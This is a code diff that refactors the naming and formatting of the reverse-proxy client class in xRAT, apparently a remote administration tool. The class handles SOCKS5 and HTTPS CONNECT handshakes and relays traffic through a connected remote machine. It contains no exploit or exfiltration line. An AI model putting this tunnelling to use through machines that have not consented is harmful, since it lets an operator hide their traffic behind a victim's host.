@@ -1,9 +1,7 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.IO;
 using System.Net.Sockets;
 using System.Text;
-using System.Threading;
 using System.Windows.Forms;
 using xServer.Core.ReverseProxy.Packets;
 
@@ -11,7 +9,13 @@ namespace xServer.Core.ReverseProxy
 {
     public class ReverseProxyClient
     {
-        public enum ProxyType { Unknown, Socks5, HTTPS };
+        public enum ProxyType
+        {
+            Unknown,
+            Socks5,
+            HTTPS
+        };
+
         public const int SOCKS5_DEFAULT_PORT = 3218;
         public const byte SOCKS5_VERSION_NUMBER = 5;
         public const byte SOCKS5_RESERVED = 0x00;
@@ -36,17 +40,17 @@ namespace xServer.Core.ReverseProxy
         public const byte SOCKS5_ADDRTYPE_IPV4 = 0x01;
         public const byte SOCKS5_ADDRTYPE_DOMAIN_NAME = 0x03;
         public const byte SOCKS5_ADDRTYPE_IPV6 = 0x04;
-        
+
         //Make it higher for more performance if really required... probably not
         //Making this number higher will aswell increase ram usage depending on the amount of connections (BUFFER_SIZE x Connections = ~Ram Usage)
-        public const int BUFFER_SIZE = 8192; 
+        public const int BUFFER_SIZE = 8192;
 
         public Socket Handle { get; private set; }
         public Client Client { get; private set; }
-        private bool ReceivedConnResponse = false;
+        private bool _receivedConnResponse = false;
 
         //Is used for the handshake, Non-Blocking
-        private MemoryStream HandshakeStream;
+        private MemoryStream _handshakeStream;
 
         public long PacketsReceived { get; private set; }
         public long PacketsSended { get; private set; }
@@ -54,7 +58,7 @@ namespace xServer.Core.ReverseProxy
         public long LengthReceived { get; private set; }
         public long LengthSended { get; private set; }
 
-        private byte[] Buffer;
+        private byte[] _buffer;
 
         public int ConnectionId
         {
@@ -65,50 +69,51 @@ namespace xServer.Core.ReverseProxy
         public ushort TargetPort { get; private set; }
         public bool IsConnected { get; private set; }
 
-
-        private bool IsConnectCommand;
-        private bool IsBindCommand;
-        private bool IsUdpCommand;
-
-        private bool IsIpType;
-        private bool IsDomainNameType;
-        private bool IsIPV6NameType;
-        private bool DisconnectIsSend = false;
+        private bool _isBindCommand;
+        private bool _isUdpCommand;
+        private bool _isConnectCommand;
+        private bool _isIpType;
+        private bool _isIPv6NameType;
+        private bool _isDomainNameType;
+        private bool _disconnectIsSend;
 
         public ProxyType Type { get; private set; }
         private ReverseProxyServer Server;
         public ListViewItem ListItem { get; set; }
 
-        public ReverseProxyClient(Client Client, Socket socket, ReverseProxyServer Server)
+        public ReverseProxyClient(Client client, Socket socket, ReverseProxyServer server)
         {
             this.Handle = socket;
-            this.Client = Client;
-            this.HandshakeStream = new MemoryStream();
-            this.Buffer = new byte[BUFFER_SIZE];
+            this.Client = client;
+            this._handshakeStream = new MemoryStream();
+            this._buffer = new byte[BUFFER_SIZE];
             this.IsConnected = true;
             this.TargetServer = "";
             this.Type = ProxyType.Unknown;
-            this.Server = Server;
+            this.Server = server;
 
             try
             {
-                socket.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, socket_Receive, null);
+                socket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, socket_Receive, null);
             }
-            catch { Disconnect(); }
+            catch
+            {
+                Disconnect();
+            }
         }
 
         private void socket_Receive(IAsyncResult ar)
         {
             try
             {
-                int Received = Handle.EndReceive(ar);
+                int received = Handle.EndReceive(ar);
 
-                if (Received <= 0)
+                if (received <= 0)
                 {
                     Disconnect();
                     return;
                 }
-                if (Received > 5000 || HandshakeStream.Length + Received > 5000)
+                if (received > 5000 || _handshakeStream.Length + received > 5000)
                 {
                     //attack prevention of overflowing the HandshakeStream
                     //It's really impossible for Socks or HTTPS proxies to use even 5000 for Initial Packets
@@ -116,8 +121,8 @@ namespace xServer.Core.ReverseProxy
                     return;
                 }
 
-                LengthReceived += Received;
-                HandshakeStream.Write(Buffer, 0, Received);
+                LengthReceived += received;
+                _handshakeStream.Write(_buffer, 0, received);
             }
             catch
             {
@@ -125,53 +130,57 @@ namespace xServer.Core.ReverseProxy
                 return;
             }
 
-            byte[] Payload = HandshakeStream.ToArray();
+            byte[] payload = _handshakeStream.ToArray();
 
             switch (PacketsReceived)
             {
                 case 0:
                 {
                     //initial Socks packet
-                    if (Payload.Length >= 3)
+                    if (payload.Length >= 3)
                     {
-                        string HeaderStr = ASCIIEncoding.ASCII.GetString(Payload);
+                        string headerStr = Encoding.ASCII.GetString(payload);
 
                         //check the proxy client
-                        if (Payload[0] == SOCKS5_VERSION_NUMBER)
+                        if (payload[0] == SOCKS5_VERSION_NUMBER)
                         {
                             Type = ProxyType.Socks5;
                         }
-                        else if (HeaderStr.StartsWith("CONNECT") && HeaderStr.Contains(":"))
+                        else if (headerStr.StartsWith("CONNECT") && headerStr.Contains(":"))
                         {
                             Type = ProxyType.HTTPS;
 
                             //Grab here the IP / PORT
-                            using (StreamReader sr = new StreamReader(new MemoryStream(Payload)))
+                            using (StreamReader sr = new StreamReader(new MemoryStream(payload)))
                             {
                                 string line = sr.ReadLine();
                                 if (line == null)
                                     break;
 
                                 //could have done it better with RegEx... oh well
-                                string[] Split = line.Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);
-                                if (Split.Length > 0)
+                                string[] split = line.Split(new string[] {" "}, StringSplitOptions.RemoveEmptyEntries);
+                                if (split.Length > 0)
                                 {
                                     try
                                     {
-                                        string IP_Port = Split[1];
-                                        this.TargetServer = IP_Port.Split(':')[0];
-                                        this.TargetPort = ushort.Parse(IP_Port.Split(':')[1]);
+                                        string ipPort = split[1];
+                                        this.TargetServer = ipPort.Split(':')[0];
+                                        this.TargetPort = ushort.Parse(ipPort.Split(':')[1]);
 
-                                        this.IsConnectCommand = true;
-                                        this.IsDomainNameType = true;
+                                        this._isConnectCommand = true;
+                                        this._isDomainNameType = true;
 
                                         //Send Command to client and wait for response from CommandHandler
-                                        new ReverseProxy_Connect(ConnectionId, this.TargetServer, this.TargetPort).Execute(Client);
+                                        new ReverseProxyConnect(ConnectionId, this.TargetServer, this.TargetPort)
+                                            .Execute(Client);
                                         Server.CallonConnectionEstablished(this);
 
                                         return; //Quit receiving and wait for client's response
                                     }
-                                    catch { Disconnect(); }
+                                    catch
+                                    {
+                                        Disconnect();
+                                    }
                                 }
                             }
                         }
@@ -180,11 +189,11 @@ namespace xServer.Core.ReverseProxy
                             break;
                         }
 
-                        if (CheckProxyVersion(Payload))
+                        if (CheckProxyVersion(payload))
                         {
                             SendSuccessToClient();
                             PacketsReceived++;
-                            HandshakeStream.SetLength(0);
+                            _handshakeStream.SetLength(0);
                             Server.CallonConnectionEstablished(this);
                         }
                     }
@@ -194,41 +203,41 @@ namespace xServer.Core.ReverseProxy
                 {
                     //Socks command
                     int MinPacketLen = 6;
-                    if (Payload.Length >= MinPacketLen)
+                    if (payload.Length >= MinPacketLen)
                     {
-                        if (!CheckProxyVersion(Payload))
+                        if (!CheckProxyVersion(payload))
                             return;
 
-                        this.IsConnectCommand = Payload[1] == 1;
-                        this.IsBindCommand = Payload[1] == 2;
-                        this.IsUdpCommand = Payload[1] == 3;
+                        this._isConnectCommand = payload[1] == 1;
+                        this._isBindCommand = payload[1] == 2;
+                        this._isUdpCommand = payload[1] == 3;
 
-                        this.IsIpType = Payload[3] == 1;
-                        this.IsDomainNameType = Payload[3] == 3;
-                        this.IsIPV6NameType = Payload[3] == 4;
+                        this._isIpType = payload[3] == 1;
+                        this._isDomainNameType = payload[3] == 3;
+                        this._isIPv6NameType = payload[3] == 4;
 
-                        Array.Reverse(Payload, Payload.Length - 2, 2);
-                        this.TargetPort = BitConverter.ToUInt16(Payload, Payload.Length - 2);
+                        Array.Reverse(payload, payload.Length - 2, 2);
+                        this.TargetPort = BitConverter.ToUInt16(payload, payload.Length - 2);
 
-                        if (IsConnectCommand)
+                        if (_isConnectCommand)
                         {
-                            if (IsIpType)
+                            if (_isIpType)
                             {
-                                this.TargetServer = Payload[4] + "." + Payload[5] + "." + Payload[6] + "." + Payload[7];
+                                this.TargetServer = payload[4] + "." + payload[5] + "." + payload[6] + "." + payload[7];
                             }
-                            else if (IsDomainNameType)
+                            else if (_isDomainNameType)
                             {
-                                int DomainLen = Payload[4];
-                                if (MinPacketLen + DomainLen < Payload.Length)
+                                int domainLen = payload[4];
+                                if (MinPacketLen + domainLen < payload.Length)
                                 {
-                                    this.TargetServer = ASCIIEncoding.ASCII.GetString(Payload, 5, DomainLen);
+                                    this.TargetServer = Encoding.ASCII.GetString(payload, 5, domainLen);
                                 }
                             }
 
                             if (this.TargetServer.Length > 0)
                             {
                                 //Send Command to client and wait for response from CommandHandler
-                                new ReverseProxy_Connect(ConnectionId, this.TargetServer, this.TargetPort).Execute(Client);
+                                new ReverseProxyConnect(ConnectionId, this.TargetServer, this.TargetPort).Execute(Client);
                             }
                         }
                         else
@@ -238,7 +247,7 @@ namespace xServer.Core.ReverseProxy
                         }
 
                         Server.CallonUpdateConnection(this);
-                        
+
                         //Quit receiving data and wait for Client's response
                         return;
                     }
@@ -248,25 +257,30 @@ namespace xServer.Core.ReverseProxy
 
             try
             {
-                Handle.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, socket_Receive, null);
+                Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, socket_Receive, null);
             }
-            catch { Disconnect(); }
+            catch
+            {
+                Disconnect();
+            }
         }
 
         public void Disconnect()
         {
-            if (!DisconnectIsSend)
+            if (!_disconnectIsSend)
             {
-                DisconnectIsSend = true;
+                _disconnectIsSend = true;
                 //send to the Server we've been disconnected
-                new ReverseProxy_Disconnect(this.ConnectionId).Execute(Client);
+                new ReverseProxyDisconnect(this.ConnectionId).Execute(Client);
             }
 
             try
             {
                 Handle.Close();
             }
-            catch { }
+            catch
+            {
+            }
 
             IsConnected = false;
             Server.CallonUpdateConnection(this);
@@ -275,17 +289,20 @@ namespace xServer.Core.ReverseProxy
         /// <summary>
         /// xRAT -> ProxyClient
         /// </summary>
-        /// <param name="Payload"></param>
-        public void SendToClient(byte[] Payload)
+        /// <param name="payload"></param>
+        public void SendToClient(byte[] payload)
         {
             lock (Handle)
             {
                 try
                 {
-                    LengthSended += Payload.Length;
-                    Handle.Send(Payload);
+                    LengthSended += payload.Length;
+                    Handle.Send(payload);
                 }
-                catch { Disconnect(); }
+                catch
+                {
+                    Disconnect();
+                }
             }
             Server.CallonUpdateConnection(this);
         }
@@ -297,7 +314,7 @@ namespace xServer.Core.ReverseProxy
 
             if (Type == ProxyType.Socks5)
             {
-                SendToClient(new byte[] { SOCKS5_VERSION_NUMBER, SOCKS5_AUTH_METHOD_REPLY_NO_ACCEPTABLE_METHODS });
+                SendToClient(new byte[] {SOCKS5_VERSION_NUMBER, SOCKS5_AUTH_METHOD_REPLY_NO_ACCEPTABLE_METHODS});
                 Disconnect();
             }
         }
@@ -305,15 +322,15 @@ namespace xServer.Core.ReverseProxy
         private void SendSuccessToClient()
         {
             if (Type == ProxyType.Socks5)
-                SendToClient(new byte[] { SOCKS5_VERSION_NUMBER, SOCKS5_CMD_REPLY_SUCCEEDED });
+                SendToClient(new byte[] {SOCKS5_VERSION_NUMBER, SOCKS5_CMD_REPLY_SUCCEEDED});
         }
 
-        private bool CheckProxyVersion(byte[] Payload)
+        private bool CheckProxyVersion(byte[] payload)
         {
             if (Type == ProxyType.HTTPS)
                 return true; //unable to check header... there is no header
 
-            if (Payload.Length > 0 && Payload[0] != SOCKS5_VERSION_NUMBER)
+            if (payload.Length > 0 && payload[0] != SOCKS5_VERSION_NUMBER)
             {
                 SendFailToClient();
                 Disconnect();
@@ -322,20 +339,20 @@ namespace xServer.Core.ReverseProxy
             return true;
         }
 
-        public void CommandResponse(ReverseProxy_ConnectResponse Response)
+        public void CommandResponse(ReverseProxyConnectResponse response)
         {
             //a small prevention for calling this method twice, not required... just incase
-            if (!ReceivedConnResponse)
+            if (!_receivedConnResponse)
             {
-                ReceivedConnResponse = true;
+                _receivedConnResponse = true;
 
-                if (Response.IsConnected)
+                if (response.IsConnected)
                 {
                     //tell the Proxy Client that we've established a connection
 
                     if (Type == ProxyType.HTTPS)
                     {
-                        SendToClient(ASCIIEncoding.ASCII.GetBytes("HTTP/1.0 200 Connection established\r\n\r\n"));
+                        SendToClient(Encoding.ASCII.GetBytes("HTTP/1.0 200 Connection established\r\n\r\n"));
                     }
                     else if (Type == ProxyType.Socks5)
                     {
@@ -348,12 +365,12 @@ namespace xServer.Core.ReverseProxy
                                 SOCKS5_CMD_REPLY_SUCCEEDED,
                                 SOCKS5_RESERVED,
                                 1, //static: it's always 1
-                                (byte)(Response.LocalEndPoint % 256),
-						        (byte)(Math.Floor((decimal)(Response.LocalEndPoint % 65536) / 256)),
-						        (byte)(Math.Floor((decimal)(Response.LocalEndPoint % 16777216) / 65536)),
-						        (byte)(Math.Floor((decimal)Response.LocalEndPoint / 16777216)),
-						        (byte)(Math.Floor((decimal)Response.LocalPort / 256)),
-						        (byte)(Response.LocalPort % 256)
+                                (byte) (response.LocalEndPoint%256),
+                                (byte) (Math.Floor((decimal) (response.LocalEndPoint%65536)/256)),
+                                (byte) (Math.Floor((decimal) (response.LocalEndPoint%16777216)/65536)),
+                                (byte) (Math.Floor((decimal) response.LocalEndPoint/16777216)),
+                                (byte) (Math.Floor((decimal) response.LocalPort/256)),
+                                (byte) (response.LocalPort%256)
                             });
                         }
                         catch
@@ -372,12 +389,12 @@ namespace xServer.Core.ReverseProxy
                         }
                     }
 
-                    HandshakeStream.Close();
+                    _handshakeStream.Close();
 
                     try
                     {
                         //start receiving data from the proxy
-                        Handle.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, socket_ReceiveProxy, null);
+                        Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, socket_ReceiveProxy, null);
                     }
                     catch
                     {
@@ -413,21 +430,21 @@ namespace xServer.Core.ReverseProxy
         {
             try
             {
-                int Received = Handle.EndReceive(ar);
+                int received = Handle.EndReceive(ar);
 
-                if (Received <= 0)
+                if (received <= 0)
                 {
                     Disconnect();
                     return;
                 }
 
-                LengthReceived += Received;
+                LengthReceived += received;
 
-                byte[] Payload = new byte[Received];
-                Array.Copy(Buffer, Payload, Received);
-                new ReverseProxy_Data(this.ConnectionId, Payload).Execute(Client);
+                byte[] payload = new byte[received];
+                Array.Copy(_buffer, payload, received);
+                new ReverseProxyData(this.ConnectionId, payload).Execute(Client);
 
-                LengthSended += Payload.Length;
+                LengthSended += payload.Length;
                 PacketsSended++;
             }
             catch
@@ -442,9 +459,11 @@ namespace xServer.Core.ReverseProxy
 
             try
             {
-                Handle.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, socket_ReceiveProxy, null);
+                Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, socket_ReceiveProxy, null);
             }
-            catch { }
+            catch
+            {
+            }
         }
     }
 }
